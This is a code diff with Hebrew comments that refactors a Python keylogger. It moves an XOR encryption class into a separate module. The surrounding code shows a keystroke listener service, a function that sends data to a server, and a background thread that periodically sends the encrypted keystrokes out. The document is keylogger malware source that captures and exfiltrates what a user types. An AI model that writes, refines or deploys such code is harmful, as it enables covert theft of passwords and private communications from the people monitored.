@@ -3,6 +3,7 @@ import requests
 import socket
 import threading
 import time
+import encryptor
 
 # שירות ההאזנה להקלדות
 class KeyLoggerService:
@@ -27,14 +28,6 @@ class KeyLoggerService:
     def start(self):
         with keyboard.Listener(on_press=self.on_press) as listener:
             listener.join()
-
-# שירות ההצפנה
-class Encryptor:
-    def __init__(self, key: str):
-        self.key = key
-
-    def xor_encrypt(self, data: str) -> str:
-        return ''.join(chr(ord(c) ^ ord(self.key[i % len(self.key)])) for i, c in enumerate(data))
 
 # שליחת הנתונים לשרת
 def send_to_server(encrypted_data):
@@ -63,7 +56,7 @@ def periodic_sender(logger, encryptor, interval=10):
 # נקודת התחלה
 if __name__ == "__main__":
     logger = KeyLoggerService()
-    encryptor = Encryptor("mysecretkey")
+    encryptor = encryptor.Encryptor("mysecretkey")
 
     sender_thread = threading.Thread(target=periodic_sender, args=(logger, encryptor), daemon=True)
     sender_thread.start()
